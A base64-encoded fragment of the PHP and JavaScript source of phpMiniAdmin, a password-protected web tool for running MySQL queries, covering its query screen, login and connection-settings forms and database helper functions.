iBpZihsc2NoaygxKSl7DQogIHZhciBsc209bHNtYXgoKSsxLGxzPWxvY2FsU3RvcmFnZTsNCiAgbHNbTFNLK2xzbV09djsNCiAgbHNbTFNLWF09bHNtOw0KICAvL2tlZXAganVzdCBsYXN0IExTTUFYIHF1ZXJpZXMgaW4gbG9nDQogIGlmKCFsc1tMU0tNXSlsc1tMU0tNXT0xOw0KICB2YXIgbHNtaW49cGFyc2VJbnQobHNbTFNLTV0pOw0KICBpZigobHNtLWxzbWluKzEpPkxTTUFYKXsNCiAgIGxzY2xlYW4obHNtaW4sbHNtLUxTTUFYKTsNCiAgfQ0KIH0NCiByZXR1cm4gdHJ1ZTsNCn0NCmZ1bmN0aW9uIHRjKHRyKXsNCiBpZiAodHIuY2xhc3NOYW1lPT0ncycpew0KICB0ci5jbGFzc05hbWU9dHIuY2xhc3NOYW1lWDsNCiB9ZWxzZXsNCiAgdHIuY2xhc3NOYW1lWD10ci5jbGFzc05hbWU7DQogIHRyLmNsYXNzTmFtZT0ncyc7DQogfQ0KfQ0KZnVuY3Rpb24gbHNjaGsoc2tpcCl7DQogaWYgKCFsb2NhbFN0b3JhZ2UgfHwgIXNraXAgJiYgIWxvY2FsU3RvcmFnZVtMU0tYXSkgcmV0dXJuIGZhbHNlOw0KIHJldHVybiB0cnVlOw0KfQ0KZnVuY3Rpb24gbHNtYXgoKXsNCiB2YXIgbHM9bG9jYWxTdG9yYWdlOw0KIGlmKCFsc2NoaygpIHx8ICFsc1tMU0tYXSlyZXR1cm4gMDsNCiByZXR1cm4gcGFyc2VJbnQobHNbTFNLWF0pOw0KfQ0KZnVuY3Rpb24gbHNjbGVhbihmcm9tLHRvKXsNCiBscz1sb2NhbFN0b3JhZ2U7DQogZm9yKHZhciBpPWZyb207aTw9dG87aSsrKXsNCiAgZGVsZXRlIGxzW0xTSytpXTtsc1tMU0tNXT1pKzE7DQogfQ0KfQ0KZnVuY3Rpb24gcV9wcmV2KCl7DQogdmFyIGxzPWxvY2FsU3RvcmFnZTsNCiBpZighbHNjaGsoKSlyZXR1cm47DQogcWN1ci0tOw0KIHZhciB4PXBhcnNlSW50KGxzW0xTS01dKTsNCiBpZihxY3VyPHgpcWN1cj14Ow0KICQoJ3FyYXcnKS52YWx1ZT1sc1tMU0srcWN1cl07DQp9DQpmdW5jdGlvbiBxX25leHQoKXsNCiB2YXIgbHM9bG9jYWxTdG9yYWdlOw0KIGlmKCFsc2NoaygpKXJldHVybjsNCiBxY3VyKys7DQogdmFyIHg9cGFyc2VJbnQobHNbTFNLWF0pOw0KIGlmKHFjdXI+eClxY3VyPXg7DQogJCgncXJhdycpLnZhbHVlPWxzW0xTSytxY3VyXTsNCn0NCmZ1bmN0aW9uIGFmdGVyX2xvYWQoKXsNCiB2YXIgRj1kb2N1bWVudC5ERjsNCiB2YXIgcD1GWyd2W3B3ZF0nXTsNCiBpZiAocCkgcC5mb2N1cygpOw0KIHFjdXI9bHNtYXgoKTsNCg0KIEYuYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JyxmdW5jdGlvbihlKXsNCiAgaWYoIUYucXJhdylyZXR1cm47DQogIGlmKCFjaGtzcWwoKSl7ZS5wcmV2ZW50RGVmYXVsdCgpO3JldHVybn0NCiAgJCgncScpLnZhbHVlPWJ0b2EoZW5jb2RlVVJJQ29tcG9uZW50KCQoJ3FyYXcnKS52YWx1ZSkucmVwbGFjZSgvJShbMC05QS1GXXsyfSkvZyxmdW5jdGlvbihtLHApe3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKCcweCcrcCl9KSk7DQogfSk7DQogdmFyIHJlcz0kKCdyZXMnKTsNCiBpZihyZXMpcmVzLmFkZEV2ZW50TGlzdGVuZXIoJ2RibGNsaWNrJyxmdW5jdGlvbihlKXsNCiAgaWYoISQoJ2lzX3NtJykuY2hlY2tlZClyZXR1cm47DQogIHZhciBlbD1lLnRhcmdldDsNCiAgaWYoZWwudGFnTmFtZSE9J1REJyllbD1lbC5wYXJlbnROb2RlOw0KICBpZihlbC50YWdOYW1lIT0nVEQnKXJldHVybjsNCiAgaWYoZWwuY2xhc3NOYW1lLm1hdGNoKC9cYlxsZ1xiLykpZWwuY2xhc3NOYW1lPWVsLmNsYXNzTmFtZS5yZXBsYWNlKC9cYmxnXGIvLCcgJyk7DQogIGVsc2UgZWwuY2xhc3NOYW1lKz0nIGxnJzsNCiB9KTsNCn0NCmZ1bmN0aW9uIGxvZ29mZigpew0KIGlmKGxzY2hrKCkpew0KICB2YXIgbHM9bG9jYWxTdG9yYWdlOw0KICB2YXIgZnJvbT1wYXJzZUludChsc1tMU0tNXSksdG89cGFyc2VJbnQobHNbTFNLWF0pOw0KICBmb3IodmFyIGk9ZnJvbTtpPD10bztpKyspew0KICAgZGVsZXRlIGxzW0xTSytpXTsNCiAgfQ0KICBkZWxldGUgbHNbTFNLTV07ZGVsZXRlIGxzW0xTS1hdOw0KIH0NCn0NCmZ1bmN0aW9uIGNmZ190b2dnbGUoKXsNCiB2YXIgZT0kKCdjZmctYWR2Jyk7DQogZS5zdHlsZS5kaXNwbGF5PWUuc3R5bGUuZGlzcGxheT09J25vbmUnPycnOidub25lJzsNCn0NCmZ1bmN0aW9uIHF0cGwocyl7DQogJCgncXJhdycpLnZhbHVlPXMucmVwbGFjZSgvJVQvZywnYDw/cGhwIGVjaG8gJF9SRVFVRVNUWyd0J10/YjY0ZCgkX1JFUVVFU1RbJ3QnXSk6J3RhYmxlbmFtZSc/PmAnKTsNCn0NCmZ1bmN0aW9uIHNtdmlldygpew0KIGlmKCQoJ2lzX3NtJykuY2hlY2tlZCl7JCgncmVzJykuY2xhc3NOYW1lKz0nIHNtJ31lbHNleyQoJ3JlcycpLmNsYXNzTmFtZSA9ICQoJ3JlcycpLmNsYXNzTmFtZS5yZXBsYWNlKC9cYnNtXGIvLCcgJyl9DQp9DQo8P3BocCBpZigkaXNfc2h0KXs/Pg0KZnVuY3Rpb24gY2hrYWxsKGNhYil7DQogdmFyIGU9ZG9jdW1lbnQuREYuZWxlbWVudHM7DQogaWYgKGUhPW51bGwpew0KICB2YXIgY2w9ZS5sZW5ndGg7DQogIGZvciAoaT0wO2k8Y2w7aSsrKXt2YXIgbT1lW2ldO2lmKG0uY2hlY2tlZCE9bnVsbCAmJiBtLnR5cGU9PSJjaGVja2JveCIpe20uY2hlY2tlZD1jYWIuY2hlY2tlZH19DQogfQ0KfQ0KZnVuY3Rpb24gc2h0KGYpew0KIGRvY3VtZW50LkRGLmRvc2h0LnZhbHVlPWY7DQp9DQo8P3BocCB9Pz4NCjwvc2NyaXB0Pg0KDQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9ImFmdGVyX2xvYWQoKSI+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIG5hbWU9IkRGIiBpZD0iREYiIGFjdGlvbj0iPD9waHAgZW8oJHNlbGYpPz4iIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iWFNTIiB2YWx1ZT0iPD9waHAgZW8oJF9TRVNTSU9OWydYU1MnXSk/PiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyZWZyZXNoIiB2YWx1ZT0iIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InAiIHZhbHVlPSIiPg0KDQo8ZGl2IGNsYXNzPSJpbnYiPg0KPGEgaHJlZj0iaHR0cDovL3BocG1pbmlhZG1pbi5zb3VyY2Vmb3JnZS5uZXQvIiB0YXJnZXQ9Il9ibGFuayI+PGI+cGhwTWluaUFkbWluIDw/cGhwIGVvKCRWRVJTSU9OKT8+PC9iPjwvYT4NCjw/cGhwIGlmICgkX1NFU1NJT05bJ2lzX2xvZ2dlZCddICYmICRkYmgpeyA/Pg0KIHwgPGEgaHJlZj0iPzw/cGhwIGVvKCR4dXJsLicmcT0nLmI2NHUoInNob3cgZGF0YWJhc2VzIikpPz4iPkRhdGFiYXNlczwvYT46IDxzZWxlY3QgbmFtZT0iZGIiIG9uQ2hhbmdlPSJmcmVmcmVzaCgpIj48b3B0aW9uIHZhbHVlPScqJz4gLSBzZWxlY3QvcmVmcmVzaCAtPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0nJz4gLSBzaG93IGFsbCAtPC9vcHRpb24+DQo8P3BocCBlY2hvIGdldF9kYl9zZWxlY3QoJGRibik/Pjwvc2VsZWN0Pg0KPD9waHAgaWYoJGRibil7ICR6PSIgJiMxODM7IDxhIGhyZWY9JyIuaHMoJHNlbGYuIj8keHVybCZkYj0iLnVlKCRkYm4pKTsgPz4NCjw/cGhwIGVjaG8gJHouJyZxPScuYjY0dSgkU0hPV19UKT8+Jz5zaG93IHRhYmxlczwvYT4NCjw/cGhwIGVjaG8gJHo/PiZzaGV4PTEnPmV4cG9ydDwvYT4NCjw/cGhwIGVjaG8gJHo/PiZzaGltPTEnPmltcG9ydDwvYT4NCjw/cGhwIH0gPz4NCiB8IDxhIGhyZWY9Ij9zaG93Y2ZnPTEiPlNldHRpbmdzPC9hPg0KPD9waHAgfSA/Pg0KPD9waHAgaWYgKCRfU0VTU0lPTlsnaXNfbG9nZ2VkJ10pez8+IHwgPGEgaHJlZj0iPzw/cGhwIGVvKCR4dXJsKT8+JmxvZ29mZj0xIiBvbmNsaWNrPSJsb2dvZmYoKSI+TG9nb2ZmPC9hPiA8P3BocCB9Pz4NCiB8IDxhIGhyZWY9Ij9waT0xIj5waHBpbmZvPC9hPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9ImVyciI+PD9waHAgZW8oJGVycl9tc2cpPz48L2Rpdj4NCg0KPD9waHANCn0NCg0KZnVuY3Rpb24gcHJpbnRfc2NyZWVuKCl7DQogZ2xvYmFsICRvdXRfbWVzc2FnZSwgJFNRTHEsICRlcnJfbXNnLCAkcmVjY291bnQsICR0aW1lX2FsbCwgJHNxbGRyLCAkcGFnZSwgJE1BWF9ST1dTX1BFUl9QQUdFLCAkaXNfbGltaXRlZF9zcWwsICRsYXN0X2NvdW50LCAkaXNfc207DQoNCiAkbmF2PScnOw0KIGlmICgkaXNfbGltaXRlZF9zcWwgJiYgKCRwYWdlIHx8ICRyZWNjb3VudD49JE1BWF9ST1dTX1BFUl9QQUdFKSApew0KICAkbmF2PSI8ZGl2IGNsYXNzPSduYXYnPiIuZ2V0X25hdigkcGFnZSwgMTAwMDAsICRNQVhfUk9XU19QRVJfUEFHRSwgImphdmFzY3JpcHQ6Z28oJXAlKSIpLiI8L2Rpdj4iOw0KIH0NCg0KIHByaW50X2hlYWRlcigpOw0KPz4NCg0KPGRpdiBjbGFzcz0iZG90IiBzdHlsZT0icGFkZGluZzozcHggMjBweCI+DQo8bGFiZWwgZm9yPSJxcmF3Ij5TUUwtcXVlcnkgKG9yIG11bHRpcGxlIHF1ZXJpZXMgc2VwYXJhdGVkIGJ5ICI7Iik6PC9sYWJlbD4mbmJzcDs8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InFuYXYiIG9uY2xpY2s9InFfcHJldigpIj4mbHQ7PC9idXR0b24+PGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJxbmF2IiBvbmNsaWNrPSJxX25leHQoKSI+Jmd0OzwvYnV0dG9uPjxicj4NCjx0ZXh0YXJlYSBpZD0icXJhdyIgY29scz0iNzAiIHJvd3M9IjEwIj48P3BocCBlbygkU1FMcSk/PjwvdGV4dGFyZWE+PGJyPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icSIgaWQ9InEiIHZhbHVlPSI8P3BocCBiNjRlKCRTUUxxKTs/PiI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJHb1NRTCIgdmFsdWU9IkdvIiBjbGFzcz0ic2J0biI+DQo8aW5wdXQgdHlwZT0iYnV0dG9uIiBuYW1lPSJDbGVhciIgdmFsdWU9IiBDbGVhciAiIG9uY2xpY2s9IiQoJ3FyYXcnKS52YWx1ZT0nJzsiIHN0eWxlPSJ3aWR0aDoxMDBweCI+DQo8P3BocCBpZighZW1wdHkoJF9SRVFVRVNUWydkYiddKSl7ID8+DQo8ZGl2IHN0eWxlPSJmbG9hdDpyaWdodCI+DQo8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iU2VsZWN0IiBjbGFzcz0ic2J0biIgb25jbGljaz0icXRwbCgnU0VMRUNUICpcbkZST00gJVRcbldIRVJFIDEnKSI+DQo8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iSW5zZXJ0IiBjbGFzcz0ic2J0biIgb25jbGljaz0icXRwbCgnSU5TRVJUIElOVE8gJVQgKGBjb2x1bW5gLCBgY29sdW1uYClcblZBTFVFUyAoXCd2YWx1ZVwnLCBcJ3ZhbHVlXCcpJykiPg0KPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlVwZGF0ZSIgY2xhc3M9InNidG4iIG9uY2xpY2s9InF0cGwoJ1VQREFURSAlVFxuU0VUIGBjb2x1bW5gPVwndmFsdWVcJ1xuV0hFUkUgMT0wJykiPg0KPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IkRlbGV0ZSIgY2xhc3M9InNidG4iIG9uY2xpY2s9InF0cGwoJ0RFTEVURSBGUk9NICVUXG5XSEVSRSAxPTAnKSI+DQo8L2Rpdj48YnIgY2xhc3M9ImNsZWFyIj4NCjw/cGhwIH0gPz4NCjwvZGl2Pg0KPGRpdiBjbGFzcz0iZG90Ij4NCjxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmc6MCAxNXB4Ij48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJpc19zbSIgdmFsdWU9IjEiIGlkPSJpc19zbSIgb25jbGljaz0ic212aWV3KCkiIDw/cGhwIGVvKCRpc19zbT8nY2hlY2tlZCc6JycpPz4+IGNvbXBhY3QgdmlldzwvbGFiZWw+PC9kaXY+DQpSZWNvcmRzOiA8Yj48P3BocCBlbygkcmVjY291bnQpOyBpZighaXNfbnVsbCgkbGFzdF9jb3VudCkgJiYgJHJlY2NvdW50PCRsYXN0X2NvdW50KXtlbygnIG91dCBvZiAnLiRsYXN0X2NvdW50KTt9Pz48L2I+IGluIDxiPjw/cGhwIGVvKCR0aW1lX2FsbCk/PjwvYj4gc2VjPGJyPg0KPGI+PD9waHAgZW8oJG91dF9tZXNzYWdlKT8+PC9iPg0KPC9kaXY+DQo8P3BocCBlY2hvICRuYXYuJHNxbGRyLiRuYXY7ID8+DQo8P3BocA0KIHByaW50X2Zvb3RlcigpOw0KfQ0KDQpmdW5jdGlvbiBwcmludF9mb290ZXIoKXsNCj8+DQo8L2Zvcm0+DQo8ZGl2IGNsYXNzPSJmdCI+JmNvcHk7IDIwMDQtMjAxNyA8YSBocmVmPSJodHRwOi8vb3NhbGFicy5jb20iIHRhcmdldD0iX2JsYW5rIj5PbGVnIFNhdmNodWs8L2E+PC9kaXY+DQo8L2JvZHk+PC9odG1sPg0KPD9waHANCn0NCg0KZnVuY3Rpb24gcHJpbnRfbG9naW4oKXsNCiBwcmludF9oZWFkZXIoKTsNCj8+DQo8Y2VudGVyPg0KPGgzPkFjY2VzcyBwcm90ZWN0ZWQgYnkgcGFzc3dvcmQ8L2gzPg0KPGRpdiBzdHlsZT0id2lkdGg6NDAwcHg7Ym9yZGVyOjFweCBzb2xpZCAjOTk5OTk5O2JhY2tncm91bmQtY29sb3I6I2VlZWVlZSI+DQo8bGFiZWw+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIiB2YWx1ZT0iIj48L2xhYmVsPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibG9naW4iIHZhbHVlPSIxIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSIgTG9naW4gIj4NCjwvZGl2Pg0KPC9jZW50ZXI+DQo8P3BocA0KIHByaW50X2Zvb3RlcigpOw0KfQ0KDQoNCmZ1bmN0aW9uIHByaW50X2NmZygpew0KIGdsb2JhbCAkREIsJGVycl9tc2csJHNlbGY7DQogcHJpbnRfaGVhZGVyKCk7DQo/Pg0KPGNlbnRlcj4NCjxoMz5EQiBDb25uZWN0aW9uIFNldHRpbmdzPC9oMz4NCjxkaXYgY2xhc3M9ImZybSI+DQo8bGFiZWw+PGRpdiBjbGFzcz0ibCI+REIgdXNlciBuYW1lOjwvZGl2PjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ2W3VzZXJdIiB2YWx1ZT0iPD9waHAgZW8oJERCWyd1c2VyJ10pPz4iPjwvbGFiZWw+PGJyPg0KPGxhYmVsPjxkaXYgY2xhc3M9ImwiPlBhc3N3b3JkOjwvZGl2PjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0idltwd2RdIiB2YWx1ZT0iIj48L2xhYmVsPjxicj4NCjxkaXYgc3R5bGU9InRleHQtYWxpZ246cmlnaHQiPjxhIGhyZWY9IiMiIGNsYXNzPSJhamF4IiBvbmNsaWNrPSJjZmdfdG9nZ2xlKCkiPmFkdmFuY2VkIHNldHRpbmdzPC9hPjwvZGl2Pg0KPGRpdiBpZD0iY2ZnLWFkdiIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPg0KPGxhYmVsPjxkaXYgY2xhc3M9ImwiPkRCIG5hbWU6PC9kaXY+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9InZbZGJdIiB2YWx1ZT0iPD9waHAgZW8oJERCWydkYiddKT8+Ij48L2xhYmVsPjxicj4NCjxsYWJlbD48ZGl2IGNsYXNzPSJsIj5NeVNRTCBob3N0OjwvZGl2PjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ2W2hvc3RdIiB2YWx1ZT0iPD9waHAgZW8oJERCWydob3N0J10pPz4iPjwvbGFiZWw+IDxsYWJlbD5wb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idltwb3J0XSIgdmFsdWU9Ijw/cGhwIGVvKCREQlsncG9ydCddKT8+IiBzaXplPSI0Ij48L2xhYmVsPjxicj4NCjxsYWJlbD48ZGl2IGNsYXNzPSJsIj5DaGFyc2V0OjwvZGl2PjxzZWxlY3QgbmFtZT0idltjaHNldF0iPjxvcHRpb24gdmFsdWU9IiI+LSBkZWZhdWx0IC08L29wdGlvbj48P3BocCBlY2hvIGNoc2V0X3NlbGVjdCgkREJbJ2Noc2V0J10pPz48L3NlbGVjdD48L2xhYmVsPjxicj4NCjxicj48bGFiZWwgZm9yID0icm1iIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InJtYiIgaWQ9InJtYiIgdmFsdWU9IjEiIGNoZWNrZWQ+IFJlbWVtYmVyIGluIGNvb2tpZXMgZm9yIDMwIGRheXMgb3IgdW50aWwgTG9nb2ZmPC9sYWJlbD4NCjwvZGl2Pg0KPGNlbnRlcj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNhdmVjZmciIHZhbHVlPSIxIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSIgQXBwbHkgIj48aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iIENhbmNlbCAiIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbj0nPD9waHAgZW8oJHNlbGYpPz4nIj4NCjwvY2VudGVyPg0KPC9kaXY+DQo8L2NlbnRlcj4NCjw/cGhwDQogcHJpbnRfZm9vdGVyKCk7DQp9DQoNCg0KLy8qIHV0aWxpdGllcw0KZnVuY3Rpb24gZGJfY29ubmVjdCgkbm9kaWU9MCl7DQogZ2xvYmFsICRkYmgsJERCLCRlcnJfbXNnOw0KDQogaWYgKCREQlsncG9ydCddKSB7DQogICAgJGRiaD1teXNxbGlfY29ubmVjdCgkREJbJ2hvc3QnXSwkREJbJ3VzZXInXSwkREJbJ3B3ZCddLCcnLChpbnQpJERCWydwb3J0J10pOw0KIH0gZWxzZSB7DQogICAgJGRiaD1teXNxbGlfY29ubmVjdCgkREJbJ2hvc3QnXSwkREJbJ3VzZXInXSwkREJbJ3B3ZCddKTsNCiB9DQogaWYgKCEkZGJoKSB7DQogICAgJGVycl9tc2c9J0Nhbm5vdCBjb25uZWN0IHRvIHRoZSBkYXRhYmFzZSBiZWNhdXNlOiAnLm15c3FsaV9jb25uZWN0X2Vycm9yKCk7DQogICAgaWYgKCEkbm9kaWUpIGRpZSgkZXJyX21zZyk7DQogfQ0KDQogaWYgKCRkYmggJiYgJERCWydkYiddKSB7DQogICRyZXM9bXlzcWxpX3NlbGVjdF9kYigkZGJoLCAkREJbJ2RiJ10pOw0KICBpZiAoISRyZXMpIHsNCiAgICAgJGVycl9tc2c9J0Nhbm5vdCBzZWxlY3QgZGIgYmVjYXVzZTogJy5teXNxbGlfZXJyb3IoJGRiaCk7DQogICAgIGlmICghJG5vZGllKSBkaWUoJGVycl9tc2cpOw0KICB9ZWxzZXsNCiAgICAgaWYgKCREQlsnY2hzZXQnXSkgZGJfcXVlcnkoIlNFVCBOQU1FUyAiLiREQlsnY2hzZXQnXSk7DQogIH0NCiB9DQoNCiByZXR1cm4gJGRiaDsNCn0NCg0KZnVuY3Rpb24gZGJfY2hlY2tjb25uZWN0KCRkYmgxPU5VTEwsICRza2lwZXJyPTApew0KIGdsb2JhbCAkZGJoOw0KIGlmICghJGRiaDEpICRkYmgxPSYkZGJoOw0KIGlmICghJGRiaDEgb3IgIW15c3FsaV9waW5nKCRkYmgxKSkgew0KICAgIGRiX2Nvbm5lY3QoJHNraXBlcnIpOw0KICAgICRkYmgxPSYkZGJoOw0KIH0NCiByZXR1cm4gJGRiaDE7DQp9DQoNCmZ1bmN0aW9uIGRiX2Rpc2Nvbm5lY3QoKXsNCiBnbG9iYWwgJGRiaDsNCiBteXNxbGlfY2xvc2UoJGRiaCk7DQp9DQoNCmZ1bmN0aW9uIGRicSgkcyl7DQogZ2xvYmFsICRkYmg7DQogaWYgKGlzX251bGwoJHMpKSByZXR1cm4gIk5VTEwiOw0KIHJldHVybiAiJyIubXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGJoLCRzKS4iJyI7DQp9DQoNCmZ1bmN0aW9uIGRiX3F1ZXJ5KCRzcWwsICRkYmgxPU5VTEwsICRza2lwZXJyPTAsICRyZXNtb2Q9TVlTUUxJX1NUT1JFX1JFU1VMVCl7DQogJGRiaDE9ZGJfY2hlY2tjb25uZWN0KCRkYmgxLCAkc2tpcGVycik7DQogJHN0aD1teXNxbGlfcXVlcnkoJGRiaDEsICRzcWwsICRyZXNtb2QpOw0KIGlmICghJHN0aCAmJiAkc2tpcGVycikgcmV0dXJuOw0KIGlmICghJHN0aCkgZGllKCJFcnJvciBpbiBEQiBvcGVyYXRpb246PGJyPlxuIi5teXNxbGlfZXJyb3IoJGRiaDEpLiI8YnI+XG4kc3FsIik7DQogcmV0dXJuICRzdGg7DQp9DQoNCmZ1bmN0aW9uIGRiX2FycmF5KCRzcWwsICRkYmgxPU5VTEwsICRza2lwZXJyPTAsICRpc251bT0wKXsjYXJyYXkgb2Ygcm93cw0KICRzdGg9ZGJfcXVlcnkoJHNxbCwgJGRiaDEsICRza2lwZXJyLCBNWVNRTElfVVNFX1JFU1VMVCk7DQogaWYgKCEkc3RoKSByZXR1cm47DQogJHJlcz1hcnJheSgpOw0KIGlmICgkaXNudW0pew0KICAgd2hpbGUoJHJvdz1teXNxbGlfZmV0Y2hfcm93KCRzdGgpKSAkcmVzW109JHJvdzsNCiB9ZWxzZXsNCiAgIHdoaWxlKCRyb3c9bXlzcWxpX2ZldGNoX2Fzc29jKCRzdGgpKSAkcmVzW109JHJvdzsNCiB9DQogbXlzcWxpX2ZyZWVfcmVzdWx0KCRzdGgpOw0KIHJldHVybiAkcmVzOw0KfQ0KDQpmdW5jdGlvbiBkYl9yb3coJHNxbCl7DQogJHN0aD1kYl9xdWVyeSgkc3FsKTsNCiByZXR1cm4gbXlzcWxpX2ZldGNoX2Fzc29jKCRzdGgpOw0KfQ0KDQpmdW5jdGlvbiBkYl92YWx1ZSgkc3FsLCRkYmgxPU5VTEwsJHNraXBlcnI9MCl7DQogJHN0aD1kYl9xdWVyeSgkc3FsLCRkYmgxLCRza2lwZXJyKTsNCiBpZiAoISRzdGgpIHJldHVybjsNCiAkcm93PW15c3FsaV9mZXRjaF9yb3coJHN0aCk7DQogcmV0dXJuICRyb3dbMF07DQp9DQoNCmZ1bmN0aW9uIGdldF9pZGVudGl0eSgkZGJoMT1OVUxMKXsNCiAkZGJoMT1kYl9jaGVja2Nvbm5lY3QoJGRiaDEpOw0KIHJldHVybiBteXNxbGlfaW5zZXJ0X2lkKCRkYmgxKTsNCn0NCg0KZnVuY3Rpb24gZ2V0X2RiX3NlbGVjdCgkc2VsPScnKXsNCiBnbG9iYWwgJERCLCRTSE9XX0Q7DQogaWYgKGlzX2FycmF5KCRfU0VTU0lPTlsnc3FsX3NkJ10pICYmICRfUkVRVUVTVFsnZGInXSE9JyonKXsvL2NoZWNrIGNhY2hlDQogICAgJGFycj0kX1NFU1NJT05bJ3NxbF9zZCddOw0KIH1lbHNlew0KICAgJGFycj1kYl9hcnJheSgkU0hPV19ELE5VTEwsMSk7DQogICBpZiAoIWlzX2FycmF5KCRhcnIpKXsNCiAgICAgICRhcnI9YXJyYXkoIDAgPT4gYXJyYXkoJ0RhdGFiYXNlJyA9PiAkREJbJ2RiJ10pICk7DQogICAgfQ0KICAgJF9TRVNTSU9OWydzcWxfc2QnXT0kYXJyOw0KIH0NCiByZXR1cm4gQHNlbCgkYXJyLCdEYXRhYmFzZScsJHNlbCk7DQp9DQoNCmZ1bmN0aW9uIGNoc2V0X3NlbGVjdCgkc2VsPScnKXsNCiBnbG9iYWwgJERCREVGOw0KICRyZXN1bHQ9Jyc7DQogaWYgKCRfU0VTU0lPTlsnc3FsX2Noc2V0J10pew0KICAgICRhcnI9JF9TRVNTSU9OWydzcWxfY2hzZXQnXTsNCiB9ZWxzZXsNCiAgICRhcnI9ZGJfYXJyYXkoInNob3cgY2hhcmFjdGVyIHNldCIsTlVMTCwxKTsNCiAgIGlmICghaXNfYXJyYXkoJGFycikpICRhcnI9YXJyYXkoYXJyYXkoJ0NoYXJzZXQnPT4kREJERUZbJ2Noc2V0J10pKTsNCiAgICRfU0VTU0lPTlsnc3FsX2Noc2V0J109JGFycjsNCiB9DQoNCiByZXR1cm4gQHNlbCgkYXJyLCdDaGFyc2V0Jywkc2VsKTsNCn0NCg0KZnVuY3Rpb24gc2VsKCRhcnIsJG4sJHNlbD0nJyl7DQogZm9yZWFjaCgkYXJyIGFzICRhKXsNCiMgICBlY2hvICRhWzBdOw0KICAgJGI9JGFbJG5dOw0KICAgJHJlcy49IjxvcHRpb24gdmFsdWU9JyIuaHMoJGIpLiInICIuKCRzZWwgJiYgJHNlbD09JGI/J3NlbGVjdGVkJzonJykuIj4iLmhzKCRiKS4iPC9vcHRpb24+IjsNCiB9DQogcmV0dXJuICRyZXM7DQp9DQoNCmZ1bmN0aW9uIG1pY3JvdGltZV9mbG9hdCgpew0KIGxpc3QoJHVzZWMsJHNlYyk9ZXhwbG9kZSgiICIsbWljcm90aW1lKCkpOw0KIHJldHVybiAoKGZsb2F0KSR1c2VjKyhmbG9hdCkkc2VjKTsNCn0NCg0KLyogcGFnZSBuYXYNCiAkcGc9aW50KCRfWzBdKTsgICAgICNjdXJyZW50IHBhZ2UNCiAkYWxsPWludCgkX1sxXSk7ICAgICAjdG90YWwgbnVtYmVyIG9mIGl0ZW1zDQogJFBQPSRfWzJdOyAgICAgICNudW1iZXIgaWYgaXRlbXMgUGVyIFBhZ2UNCiAkcHRwbD0kX1szXTsgICAgICAjcGFnZSB1cmwgL3Vrci9kb2xsYXIvbm90ZXMucGhwP3BhZ2U9ICAgIGZvciBub3Rlcy5waHANCiAkc2hvd19hbGw9JF9bNV07ICAgICAgICAgICAjcHJpbnQgVG90YWxzPw0KKi8NCmZ1bmN0aW9uIGdldF9uYXYoJHBnLCAkYWxsLCAkUFAsICRwdHBsLCAkc2hvd19hbGw9Jycpew0KICAkbj0nJm5ic3A7JzsNCiAgJHNlcD0iICRufCRuXG4iOw0KICBpZiAoISRQUCkgJFBQPTEwOw0KICAkYWxscD1mbG9vcigkYWxsLyRQUCswLjk5OTk5OSk7DQoNCiAgJHBuYW1lPScnOw0KICAkcmVzPScnOw0KICAkdz1hcnJheSgnTGVzcycsJ01vcmUnLCdCYWNrJywnTmV4dCcsJ0ZpcnN0JywnVG90YWwnKTsNCg0KICAkc3A9JHBnLTI7DQogIGlmKCRzcDwwKSAkc3A9MDsNCiAgaWYoJGFsbHAtJHNwPDUgJiYgJGFsbHA+PTUpICRzcD0kYWxscC01Ow0KDQogICRyZXM9IiI7DQoNCiAgaWYoJHNwPjApew0KICAgICRwbmFtZT1wZW4oJHNwLTEsJHB0cGwpOw0KICAgICRyZXMuPSI8YSBocmVmPSckcG5hbWUnPiR3WzBdPC9hPiI7DQogICAgJHJlcy49JHNlcDsNCiAgfQ0KICBmb3IoJHBfcD0kc3A7JHBfcDwkYWxscCAmJiAkcF9wPCRzcCs1OyRwX3ArKyl7DQogICAgICRmaXJzdF9zPSRwX3AqJFBQKzE7DQogICAgICRsYXN0X3M9KCRwX3ArMSkqJFBQOw0KICAgICAkcG5hbWU9cGVuKCRwX3AsJHB0cGwpOw0KICAgICBpZigkbGFzdF9zPiRhbGwpew0KICAgICAgICRsYXN0X3M9JGFsbDsNCiAgICAgfQ0KICAgICBpZigk